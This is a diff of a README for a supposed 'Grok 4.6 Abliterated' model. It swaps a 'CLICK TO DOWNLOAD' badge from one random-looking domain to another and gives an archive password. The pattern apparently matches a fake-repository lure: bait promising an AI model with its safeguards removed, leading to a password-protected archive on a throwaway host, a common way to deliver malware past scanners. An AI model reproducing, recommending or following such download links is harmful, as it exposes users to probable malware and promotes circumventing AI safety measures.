@@ -1,6 +1,6 @@
 # Grok 4.6 Abliterated
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/grok-4-6-abliterated)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/grok-4-6-abliterated)
 > #### Archive password: `2026`
 
 
